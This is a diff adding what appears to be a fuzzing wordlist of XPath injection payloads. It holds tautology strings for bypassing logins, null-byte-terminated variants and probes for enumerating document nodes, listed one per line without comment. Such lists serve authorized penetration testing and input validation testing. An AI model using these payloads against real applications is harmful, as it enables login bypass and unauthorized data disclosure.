@@ -1,0 +1,51 @@
+"
+" or ""="
+" or "1"="1
+$x("//div")
+'
+' and '1'='0
+' and '1'='1
+' and count(/*)=1 and '1'='1
+' and count(/@*)=1 and '1'='1
+' and count(/comment())=1 and '1'='1
+' or "a" or '
+' or ''='
+' or ''=''
+' or '1'='0
+' or '1'='1
+' or '1'='1'
+' or /* or '
+' or 1 or '
+' or 1=1 or 'a'='a'
+' or 1=1 or //*[1=1][1=1] or ''
+' or 1]%00
+' or true() or '
+'%20or%201=1]/child::node()%00
+')] | //node/*[contains(*,'
+'a' or true() or '
+'or'1'='1
+'text' or '1' = '1'
+(
+)
+*
+*/*
+.
+..
+/
+//
+//*
+//*[contains(@*,'')
+1][1
+@
+@*
+[
+]
+admin' or 1=1]%00
+admin']%00
+count(/child::node())
+last()-1 and 1=2
+node()
+x' or 1=1 or 'x'='y
+x' or name()='username' or 'x'='y
+|
+|//*
